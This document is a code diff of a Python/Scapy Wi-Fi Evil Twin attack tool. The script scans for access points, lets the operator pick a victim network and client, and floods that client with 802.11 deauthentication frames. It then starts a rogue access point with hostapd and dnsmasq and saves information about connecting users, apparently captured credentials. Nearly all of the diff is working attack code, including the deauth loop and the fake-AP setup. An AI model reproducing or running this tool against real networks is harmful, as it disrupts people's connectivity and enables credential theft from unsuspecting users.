@@ -21,6 +21,7 @@ def AP_Scaning(sniff_network_adapter):
     
     print("Scanning for Access Points with %s..." % sniff_network_adapter)
     # Scan for 30 seconds
+    # prn = fucntion to handle with packets
     sniff(iface = sniff_network_adapter, prn = PacketHandlerAP, timeout = 30)
 
     rescan = input("\nDo you want to rescan? [y/n]: ")
@@ -33,17 +34,20 @@ def AP_Scaning(sniff_network_adapter):
 countAP = 0
 def PacketHandlerAP(packet):
     global countAP
-    # if packet has 802.11 layer (Beacoin) and filter type & subtype of packets
+    # if packet has 802.11 layer (specification)
     if packet.haslayer(Dot11):
+        # filter type & subtype of packets (Beacon frame)
         if (packet.type == 0 and packet.subtype == 8):
             if [packet.addr2, packet.info, int(ord(packet[Dot11Elt:3].info))] not in AP_List:
-                #AP, SSID, Channel
+                #MAC AP, SSID, Channel
                 AP_List.append([packet.addr2, packet.info,
                                int(ord(packet[Dot11Elt:3].info))])
                 print("Index: %s | Access Point MAC: %s | with SSID: %s  | Channel: %d" %(countAP,packet.addr2,packet.info, int(ord(packet[Dot11Elt:3].info))))
                 countAP = countAP + 1
 
 # -------- Selecting which access point(WLAN) we want to attack --------------
+
+MAC_AP_victim = ""
 
 def attackAP(sniff_network_adapter, fakeAP_network_adapter):
     result = input("Choose number of AP to attack: ")
@@ -58,22 +62,28 @@ def attackAP(sniff_network_adapter, fakeAP_network_adapter):
     fake_ap.Create_hostapd(fakeAP_network_adapter, ssid, Channel_victim)
     fake_ap.Create_dnsmasq(fakeAP_network_adapter)
 
-    # Change your network card to the same channel of AP victim
+    # Change your network card to the same channel as the AP of victim 
     os.system('iwconfig %s channel %d' % (sniff_network_adapter, Channel_victim))
 
     # Client scanning from chosen AP
-    MAC_victim = AP_List[int(result)][0]
-    clientScaning(MAC_victim, sniff_network_adapter)
+    global MAC_AP_victim
+    MAC_AP_victim = AP_List[int(result)][0]
+    clientScaning(sniff_network_adapter)
+
+    while len(clientList) == 0:
+        print("No clients found, searching again...")
+        clientScaning(sniff_network_adapter)
+
+    rescan = input("Do you want to rescan? [y/n]: ")
+    if(rescan == "y"):
+        clientScaning(sniff_network_adapter)
 
 # ------------------------------------------------------------------
 
 clientList = []
-target_mac = ""
 
-def clientScaning(MAC_victim, sniff_network_adapter):
-    print("Scanning for clients of AP: %s..." %MAC_victim)
-    global target_mac
-    target_mac = MAC_victim
+def clientScaning(sniff_network_adapter):
+    print("Scanning for clients of AP: %s..." %MAC_AP_victim)
     sniff(iface = sniff_network_adapter, prn = PacketHandlerClients, timeout=30)
 
 # ------------------------------------------------------------------
@@ -81,13 +91,11 @@ def clientScaning(MAC_victim, sniff_network_adapter):
 # Sniff packets of client
 counter_clients = 0
 def PacketHandlerClients(packet):
-    global clientList
+    # global clientList
     global counter_clients
-    #
-    if ((packet.addr2 == target_mac or packet.addr3 == target_mac) and packet.addr1 != "ff:ff:ff:ff:ff:ff"):
-        #
+    #Broadcast Message = ff:ff:ff:ff:ff:ff
+    if ((packet.addr2 == MAC_AP_victim or packet.addr3 == MAC_AP_victim) and packet.addr1 != "ff:ff:ff:ff:ff:ff"):
         if packet.addr1 not in clientList:
-            #
             if packet.addr2 != packet.addr1 and packet.addr1 != packet.addr3:
                 clientList.append(packet.addr1)
                 print("Index: %s | MAC Client: %s" %(counter_clients,packet.addr1))
@@ -96,33 +104,35 @@ def PacketHandlerClients(packet):
 
 # -------------Selecting a victim (client) and performing an Evil-Twin attack ---------------
 
-# Disconnects the target client from the network
-def attackClient(sniff_network_adapter, fakeAP_network_adapter):
-    while len(clientList) == 0:
-        print("No clients found, searching again...")
-        clientScaning(target_mac, sniff_network_adapter)
 
-    rescan = input("Do you want to rescan? [y/n]: ")
-    if(rescan == "y"):
-        clientScaning(target_mac, sniff_network_adapter)
+def attackClient(sniff_network_adapter, fakeAP_network_adapter):
 
     choice = input("Choose index of client to attack: ")
 
+    # Disconnects the target client from the network
     disconnectThread = threading.Thread(
         target=DisconnectAttack, args=(choice, sniff_network_adapter))
     disconnectThread.daemon = True
     disconnectThread.start()
 
-    time.sleep(5)
+    time.sleep(10)
+
+    #Set Fake AP that the victim can connect to it
+    setupAP(fakeAP_network_adapter)
+    finish = input('--------Press Enter to stop FakeAP--------\n')
 
 # ------------------------------------------------------------------
 
 def DisconnectAttack(choice, sniff_network_adapter):
-        # send the packet
-        for y in range(1000):
-            dot11 = Dot11(addr1 = clientList[int(choice)], addr2=target_mac, addr3=target_mac)
-            packet = RadioTap()/dot11/Dot11Deauth()
-            sendp(packet, iface=sniff_network_adapter, count=30, inter = .001)
+        # RadioTap - Adds additional metadata to an 802.11 frame
+        # Dot11 - For creating 802.11 frame
+        # Dot11Deauth - For creating deauth frame
+        # sendp - for sending packets
+        dot11 = Dot11(addr1 = clientList[int(choice)], addr2=MAC_AP_victim, addr3=MAC_AP_victim)
+        packet = RadioTap()/dot11/Dot11Deauth()
+
+        for i in range(50):
+            sendp(packet, iface=sniff_network_adapter, count=50, inter = .001)
 
         print('---> Finishing sending prob requests to AP...\n')
 
@@ -164,8 +174,6 @@ if __name__ == "__main__":
         attackAP(sniff_network_adapter, fakeAP_network_adapter)
         attackClient(sniff_network_adapter, fakeAP_network_adapter)
 
-        setupAP(fakeAP_network_adapter)
-        finish = input('--------Press Enter to stop FakeAP--------\n')
         save_info_users()
     
     elif int(choise) == 2:
